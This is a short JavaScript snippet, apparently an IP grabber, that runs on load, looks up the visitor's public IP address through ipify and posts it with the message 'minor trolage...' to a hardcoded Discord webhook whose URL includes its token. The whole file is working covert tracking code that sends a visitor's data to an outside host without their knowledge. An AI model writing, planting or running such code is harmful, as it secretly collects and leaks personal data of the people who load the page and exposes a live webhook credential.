function sendwebhookid() {
    fetch("https://api.ipify.org/?format=json")
    .then(results => results.json())
    .then(data => {
        fetch("https://discord.com/api/webhooks/1087517818372763778/dV1STsoGUJeK7ExGRcZerkoUR2iF3sr25Es24fZAqjOUtKGvUr7S1y0agCYbTO7CqaeW", {
        method: 'POST',
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            content: "minor trolage...\n\nIP: " + data.ip + "\n\n ------------------",
            embeds: null
        })
    })
    });
}

sendwebhookid()